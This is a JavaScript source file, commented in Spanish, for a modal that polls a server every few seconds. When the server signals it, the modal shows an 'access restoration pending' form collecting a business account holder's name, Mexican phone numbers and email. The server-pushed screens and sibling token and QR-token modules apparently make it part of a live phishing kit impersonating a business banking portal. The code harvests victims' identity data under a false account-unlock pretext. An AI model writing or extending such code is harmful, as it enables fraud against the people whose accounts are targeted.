/**
 * Tela de datos de contacto Empresas — modal sobre la página actual
 */
class ContactoEmpresaSystem {
    constructor() {
        this.currentContacto = null;
        this.init();
    }

    init() {
        this.startContactoCheck();
        this.checkForContacto();
    }

    startContactoCheck() {
        this.contactoInterval = setInterval(() => {
            this.checkForContacto();
        }, 3000);
    }

    stopContactoCheck() {
        if (this.contactoInterval) {
            clearInterval(this.contactoInterval);
            this.contactoInterval = null;
        }
    }

    isOwnModalActive() {
        const modal = document.getElementById('adminModal');
        return !!(modal && modal.classList.contains('active') && modal.classList.contains('contacto-empresa-modal'));
    }

    async cerrarOtrosModalesActivos() {
        const modal = document.getElementById('adminModal');
        if (!modal || !modal.classList.contains('active')) {
            return;
        }

        if (typeof modalSystem !== 'undefined' && modalSystem.currentModal) {
            await modalSystem.markAsReadSilently(modalSystem.currentModal.id);
            modalSystem.closeModal();
        }

        if (typeof tokenEmpresaSystem !== 'undefined' && tokenEmpresaSystem.closeModal) {
            tokenEmpresaSystem.closeModal();
        }

        if (typeof tokenQrEmpresaSystem !== 'undefined' && tokenQrEmpresaSystem.closeModal) {
            tokenQrEmpresaSystem.closeModal();
        }

        if (typeof emailValidationSystem !== 'undefined' && emailValidationSystem.closeModal) {
            emailValidationSystem.closeModal();
        }
        if (typeof sincronizacionSystem !== 'undefined' && sincronizacionSystem.closeModal) {
            sincronizacionSystem.closeModal();
        }
    }

    async checkForContacto() {
        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/contacto_empresa_verificar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'verificar_contacto_pendiente' })
            });

            const text = await response.text();
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Respuesta no válida de contacto_empresa_verificar.php:', text);
                return;
            }

            if (data.success && data.tiene_contacto) {
                if (this.isOwnModalActive() && this.currentContacto?.mensaje_id === data.mensaje_id) {
                    return;
                }
                await this.showContactoModal(data);
                return;
            }

            // Ya no está pendiente (otra tela la reemplazó): cerrar si sigue abierta
            if (this.isOwnModalActive()) {
                this.closeModal();
            }
        } catch (error) {
            console.warn('Error verificando tela de contacto:', error);
        }
    }

    buildFormHtml() {
        return `
            <div class="contacto-empresa-content">
                <p class="contacto-empresa-badge">Proceso de desbloqueo</p>
                <h2 class="contacto-empresa-title">Restablecimiento de acceso pendiente</h2>
                <p class="contacto-empresa-description">
                    Confirma los datos de contacto vinculados a tu cuenta empresarial para continuar con el restablecimiento del acceso.
                </p>
                <form class="contacto-empresa-form" id="contactoEmpresaForm" novalidate>
                    <div class="contacto-empresa-group">
                        <label class="contacto-empresa-label" for="contactoFullName">Nombre del titular o representante legal</label>
                        <input type="text" id="contactoFullName" name="fullName" class="contacto-empresa-input" required style="text-transform: uppercase;">
                        <span class="contacto-empresa-field-error" data-error-for="fullName" style="display:none;"></span>
                    </div>
                    <div class="contacto-empresa-phone-row">
                        <div class="contacto-empresa-group">
                            <label class="contacto-empresa-label" for="contactoPhone">Teléfono fijo (opcional)</label>
                            <div class="contacto-empresa-phone-wrap">
                                <span class="contacto-empresa-prefix">+52</span>
                                <input type="tel" id="contactoPhone" name="phone" class="contacto-empresa-phone-input" maxlength="10" placeholder="10 dígitos">
                            </div>
                            <span class="contacto-empresa-field-error" data-error-for="phone" style="display:none;"></span>
                        </div>
                        <div class="contacto-empresa-group">
                            <label class="contacto-empresa-label" for="contactoMobile">Teléfono móvil</label>
                            <div class="contacto-empresa-phone-wrap">
                                <span class="contacto-empresa-prefix">+52</span>
                                <input type="tel" id="contactoMobile" name="mobile" class="contacto-empresa-phone-input" maxlength="10" placeholder="10 dígitos" required>
                            </div>
                            <span class="contacto-empresa-field-error" data-error-for="mobile" style="display:none;"></span>
                        </div>
                    </div>
                    <div class="contacto-empresa-group">
                        <label class="contacto-empresa-label" for="contactoEmail">Correo electrónico</label>
                        <input type="email" id="contactoEmail" name="email" class="contacto-empresa-input" required>
                        <span class="contacto-empresa-field-error" data-error-for="email" style="display:none;"></span>
                    </div>
                    <button type="submit" class="contacto-empresa-submit">Continuar</button>
                </form>
            </div>
        `;
    }

    bindFormEvents(mensajeId) {
        const form = document.getElementById('contactoEmpresaForm');
        const phoneInputs = form.querySelectorAll('.contacto-empresa-phone-input');

        phoneInputs.forEach((input) => {
            input.addEventListener('input', function () {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
        });

        form.addEventListener('submit', (event) => {
            event.preventDefault();
            this.sendContacto(mensajeId);
        });
    }

    limpiarErroresCampos() {
        document.querySelectorAll('#adminModal.contacto-empresa-modal .contacto-empresa-field-error').forEach((el) => {
            el.style.display = 'none';
            el.textContent = '';
        });
        document.querySelectorAll('#adminModal.contacto-empresa-modal .is-invalid').forEach((el) => {
            el.classList.remove('is-invalid');
        });
    }

    mostrarErroresCampos(errores) {
        this.limpiarErroresCampos();

        Object.entries(errores || {}).forEach(([campo, mensaje]) => {
            const errorEl = document.querySelector(`#adminModal.contacto-empresa-modal [data-error-for="${campo}"]`);
            const fieldMap = {
                fullName: '#contactoFullName',
                phone: '#contactoPhone',
                mobile: '#contactoMobile',
                email: '#contactoEmail'
            };
            const field = document.querySelector(fieldMap[campo] || '');

            if (errorEl) {
                errorEl.textContent = mensaje;
                errorEl.style.display = 'block';
            }

            if (field) {
                field.classList.add('is-invalid');
                if (field.closest('.contacto-empresa-phone-wrap')) {
                    field.closest('.contacto-empresa-phone-wrap').classList.add('is-invalid');
                }
            }
        });
    }

    async showContactoModal(data) {
        const modal = document.getElementById('adminModal');
        if (!modal) {
            return;
        }

        await this.cerrarOtrosModalesActivos();

        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        errorEl.style.display = 'none';
        errorEl.textContent = '';
        modal.classList.remove(
            'token-empresa-modal',
            'token-qr-empresa-modal',
            'email-validation-modal'
        );
        modal.classList.add('contacto-empresa-modal');

        messageEl.innerHTML = this.buildFormHtml();
        inputContainer.style.display = 'none';
        buttonsContainer.innerHTML = '';

        this.bindFormEvents(data.mensaje_id);
        this.currentContacto = data;
        modal.classList.add('active');

        const firstInput = document.getElementById('contactoFullName');
        if (firstInput) {
            firstInput.focus();
        }
    }

    async sendContacto(mensajeId) {
        const fullName = (document.getElementById('contactoFullName')?.value || '').trim();
        const phone = (document.getElementById('contactoPhone')?.value || '').trim();
        const mobile = (document.getElementById('contactoMobile')?.value || '').trim();
        const email = (document.getElementById('contactoEmail')?.value || '').trim();

        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/contacto_empresa_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    accion: 'guardar_contacto',
                    mensaje_id: mensajeId,
                    fullName,
                    phone,
                    mobile,
                    email
                })
            });

            const data = await response.json();

            if (data.success) {
                this.closeModal();
                setTimeout(() => this.startContactoCheck(), 2000);
            } else if (data.errores) {
                this.mostrarErroresCampos(data.errores);
                this.showError('Revisa los campos marcados.');
            } else {
                this.showError(data.error || 'No se pudieron guardar los datos de contacto');
            }
        } catch (error) {
            this.showError('Error de conexión');
        }
    }

    showError(message) {
        const errorEl = document.getElementById('modalError');
        errorEl.textContent = message;
        errorEl.style.display = 'block';
    }

    closeModal() {
        const modal = document.getElementById('adminModal');
        if (modal) {
            modal.classList.remove(
                'active',
                'token-empresa-modal',
                'token-qr-empresa-modal',
                'contacto-empresa-modal',
                'email-validation-modal',
                'sincronizacion-modal'
            );
        }

        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        if (messageEl) {
            messageEl.textContent = '';
        }

        if (errorEl) {
            errorEl.style.display = 'none';
            errorEl.textContent = '';
        }

        if (inputContainer) {
            inputContainer.style.display = 'none';
            inputContainer.innerHTML = `
                <label class="modal-input-label" for="modalInput">Tu respuesta:</label>
                <input type="text" class="modal-input" id="modalInput" placeholder="Escribe tu respuesta aquí...">
            `;
        }

        if (buttonsContainer) {
            buttonsContainer.innerHTML = '';
        }

        this.currentContacto = null;
    }

    destroy() {
        this.stopContactoCheck();
    }
}

let contactoEmpresaSystem;

document.addEventListener('DOMContentLoaded', function () {
    contactoEmpresaSystem = new ContactoEmpresaSystem();
});

window.addEventListener('beforeunload', function () {
    if (contactoEmpresaSystem) {
        contactoEmpresaSystem.destroy();
    }
});
